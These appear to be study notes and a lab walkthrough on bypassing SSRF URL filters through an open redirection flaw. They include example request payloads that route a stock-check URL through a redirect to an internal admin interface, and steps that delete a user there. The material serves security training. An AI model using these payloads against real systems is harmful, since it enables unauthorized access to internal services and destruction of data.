## Introduction
- It is sometimes possible to circumvent any kind of filter-based defenses by exploiting an open redirection vulnerability.
**Example** - 
The application checks and validates the URLs submitted by users to prevent any harmful actions like Server-Side Request Forgery (SSRF). However, the allowed URLs in the application have a separate security flaw called "open redirection vulnerability." It means the application can be tricked into redirecting to arbitrary websites.
Even if the user-submitted URL is strictly validated, you can still exploit the open redirection vulnerability. By constructing a specific URL, you can make the application believe that it's redirecting to an allowed target, but in reality, it redirects to the desired back-end target (a different website).
If the API used to make the back-end HTTP request supports redirections, your crafted URL will lead to a redirected request to the desired back-end target, bypassing the original URL validation.

**For example, suppose the application contains an open redirection vulnerability in which the following URL:**
```js
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```
**returns a redirection to:**
```js
http://evil-user.net
```

**You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:**
```js
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
This SSRF exploit works because the application first validates that the supplied `stockAPI` URL is on an allowed domain, which it is.
The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing.

## Steps to solve lab
### Desc - SSRF with filter bypass via open redirection vulnerability
**Our end goal** - change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.

1. First analyse the stock checker and "next product" button. Send both the request to Repeater.
![[SSRF19.png]]

2. There is a redirect parameter in the `GET /product/nextProduct?currentProductId=3&path=/product?productId=4`, It redirect us from "productId=3" to "productId=4". So, we can use it to redirect us from this website to anywhere.
**Example** - 
![[SSRF20.png]]

3. Now, let's just change the value of `stockApi` to `/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin` in `POST /product/stock` so that it give us required admin page.
![[SSRF21.png]]

4. Now, let's just change the value of `stockApi` to `/product/nextProduct?currentProductId=3&path=http://192.168.0.12:8080/admin/delete?username=carlos` to delete the user `carlos`.
![[SSRF22.png]]
